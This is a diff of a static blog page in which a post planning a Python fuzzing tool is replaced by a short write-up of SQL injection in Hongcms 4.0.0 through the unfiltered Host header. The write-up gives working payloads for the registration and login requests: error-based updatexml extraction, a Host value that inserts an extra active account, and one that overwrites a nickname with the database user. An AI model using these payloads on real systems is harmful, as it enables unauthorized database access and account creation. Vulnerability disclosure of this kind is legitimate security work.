@@ -108,25 +108,29 @@
 
 
 
-  <meta name="description" content="在家无事，于是乎想自己开发一款工具，方便自己使用，顺便提高下能力吧~">
-<meta name="keywords" content="Fuzz,Python">
+  <meta name="description" content="Because there is no filtering of the Host header, there are at least two SQL injections.">
+<meta name="keywords" content="Web,PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="想要写出来自己的东西~~">
-<meta property="og:url" content="http://yoursite.com/2019/02/01/Evil/index.html">
+<meta property="og:title" content="Hongcms 4.0.0">
+<meta property="og:url" content="http://yoursite.com/2019/04/05/hongcms/index.html">
 <meta property="og:site_name" content="Noel&#39;s Blog">
-<meta property="og:description" content="在家无事，于是乎想自己开发一款工具，方便自己使用，顺便提高下能力吧~">
+<meta property="og:description" content="Because there is no filtering of the Host header, there are at least two SQL injections.">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-02-01T14:26:14.675Z">
+<meta property="og:image" content="http://yoursite.com/2019/04/05/hongcms/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/05/hongcms/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/05/hongcms/3.png">
+<meta property="og:updated_time" content="2019-04-05T07:32:32.080Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="想要写出来自己的东西~~">
-<meta name="twitter:description" content="在家无事，于是乎想自己开发一款工具，方便自己使用，顺便提高下能力吧~">
+<meta name="twitter:title" content="Hongcms 4.0.0">
+<meta name="twitter:description" content="Because there is no filtering of the Host header, there are at least two SQL injections.">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/05/hongcms/1.png">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/02/01/Evil/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/04/05/hongcms/"/>
 
 
 
@@ -136,7 +140,7 @@
   };
 </script>
 
-  <title>想要写出来自己的东西~~ | Noel's Blog</title>
+  <title>Hongcms 4.0.0 | Noel's Blog</title>
   
 
 
@@ -297,7 +301,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/01/Evil/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/05/hongcms/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Noel">
@@ -314,7 +318,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">想要写出来自己的东西~~
+          <h1 class="post-title" itemprop="name headline">Hongcms 4.0.0
               
             
           </h1>
@@ -339,7 +343,7 @@
                 
               
 
-              <time title="创建时间：2019-02-01 00:00:00 / 修改时间：22:26:14" itemprop="dateCreated datePublished" datetime="2019-02-01T00:00:00+08:00">2019-02-01</time>
+              <time title="创建时间：2019-04-05 00:00:00 / 修改时间：15:32:32" itemprop="dateCreated datePublished" datetime="2019-04-05T00:00:00+08:00">2019-04-05</time>
             
 
             
@@ -361,7 +365,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/开发/" itemprop="url" rel="index"><span itemprop="name">开发</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
 
                 
                 
@@ -403,33 +407,19 @@
       
 
       
-        <font color="green">在家无事，于是乎想自己开发一款工具，方便自己使用，顺便提高下能力吧~</font>
-
+        <font color="green">Because there is no filtering of the Host header, there are at least two SQL injections.</font>
 
 <a id="more"></a>
-<h2 id="X-Fuzz工具"><a href="#X-Fuzz工具" class="headerlink" title="X-Fuzz工具"></a>X-Fuzz工具</h2><h3 id="预期功能"><a href="#预期功能" class="headerlink" title="预期功能"></a><font color="green">预期功能</font></h3><ul>
-<li>对目标网站目录进行爆破</li>
-<li>对目标网站参数进行爆破</li>
-<li>对目标网站子域名进行爆破</li>
-<li>每次爆破后更新字典，出现频率高的字段，排名靠前</li>
-</ul>
-<h3 id="使用技术"><a href="#使用技术" class="headerlink" title="使用技术"></a><font color="green">使用技术</font></h3><ul>
-<li>Python 主要使用Python</li>
-<li>Redis     用来储存字典</li>
-<li>其他       可能用到的别的</li>
-</ul>
-<h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a><font color="green">目的</font></h3><ul>
-<li>方便渗透测试</li>
-<li>自我锻炼</li>
-</ul>
-<h3 id="用时"><a href="#用时" class="headerlink" title="用时"></a><font color="green">用时</font></h3><ul>
-<li>整个寒假</li>
-<li>率先完成对目录爆破的部分</li>
-</ul>
-<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a><font color="green">后续</font></h3><ul>
-<li>尽量每天更新代码</li>
-<li>每天还会有别的更新</li>
-</ul>
+<h3 id="Register"><a href="#Register" class="headerlink" title="Register"></a><font color="dark">Register</font></h3><p>When we fill out the information, click Submit and capture the package.Modify the Host value to <code>&#39; or updatexml(1, concat(0x7e,user(),0x7e),1) or &#39;</code>Add X-Forwarded-For and it’s value is <code>a</code>,then we put the package.</p>
+<p><img src="/2019/04/05/hongcms/1.png" alt=""></p>
+<p>We can also add an administrator account or an active normal account.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Host: &apos;,1,&apos;&apos;,&apos;&apos;),(1,1,&apos;aadmin&apos;,md5(&apos;12345&apos;),&apos;&apos;,&apos;1554448599&apos;,&apos;</span><br><span class="line">X-Forwarded-For: a</span><br></pre></td></tr></table></figure>
+<p>Added a active user for the below.</p>
+<p><img src="/2019/04/05/hongcms/2.png" alt=""></p>
+<p>The active user has been inserted in the database.</p>
+<p>Because register need to re-catch each time,we can use the login to get more information.</p>
+<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a><font color="dark">Login</font></h3><p>Use the active user to login,and catch the package.Modify the Host value to <code>&#39;,nickname=user(),lastip =&#39;</code>Add X-Forwarded-For and it’s value is <code>a</code>,then we put the package.</p>
+<p><img src="/2019/04/05/hongcms/3.png" alt=""></p>
 
       
     </div>
@@ -450,9 +440,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Fuzz/" rel="tag"><i class="fa fa-tag"></i> Fuzz</a>
+            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
           
-            <a href="/tags/Python/" rel="tag"><i class="fa fa-tag"></i> Python</a>
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
           
         </div>
       
@@ -465,8 +455,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/31/使用navicat来脱裤吧!/" rel="next" title="Navicat脱裤">
-                <i class="fa fa-chevron-left"></i> Navicat脱裤
+              <a href="/2019/04/03/UsualToolCMS/" rel="next" title="UsualToolCMS">
+                <i class="fa fa-chevron-left"></i> UsualToolCMS
               </a>
             
           </div>
@@ -474,10 +464,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/02/02/Apkatshu/" rel="prev" title="Apk逆向分析工具 ---Apkatshu">
-                Apk逆向分析工具 ---Apkatshu <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -685,7 +671,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#X-Fuzz工具"><span class="nav-number">1.</span> <span class="nav-text">X-Fuzz工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#预期功能"><span class="nav-number">1.1.</span> <span class="nav-text">预期功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用技术"><span class="nav-number">1.2.</span> <span class="nav-text">使用技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目的"><span class="nav-number">1.3.</span> <span class="nav-text">目的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用时"><span class="nav-number">1.4.</span> <span class="nav-text">用时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后续"><span class="nav-number">1.5.</span> <span class="nav-text">后续</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Register"><span class="nav-number">1.</span> <span class="nav-text">Register</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Login"><span class="nav-number">2.</span> <span class="nav-text">Login</span></a></li></ol></div>
             
 
           </div>
